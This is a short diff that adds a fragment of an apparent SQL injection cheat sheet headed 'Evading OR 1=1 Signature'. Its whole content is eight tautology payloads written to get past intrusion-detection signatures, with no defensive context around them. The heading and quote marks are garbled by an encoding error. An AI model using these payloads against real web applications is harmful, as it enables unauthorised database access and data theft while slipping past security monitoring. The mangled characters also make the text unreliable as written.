@@ -1,0 +1,21 @@
+10¡¢±Ü¿ªIDS¼ì²â
+
+Evading ¡® OR 1=1 Signature
+
+
+
+- ¡® OR ¡®unusual¡¯ = ¡®unusual¡¯
+
+- ¡® OR ¡¯something¡¯ = ¡¯some¡¯+'thing¡¯
+
+- ¡® OR ¡®text¡¯ = N¡¯text¡¯
+
+- ¡® OR ¡¯something¡¯ like ¡¯some%¡¯
+
+- ¡® OR 2 > 1
+
+- ¡® OR ¡®text¡¯ > ¡®t¡¯
+
+- ¡® OR ¡®whatever¡¯ in (¡¯whatever¡¯)
+
+- ¡® OR 2 BETWEEN 1 and 3
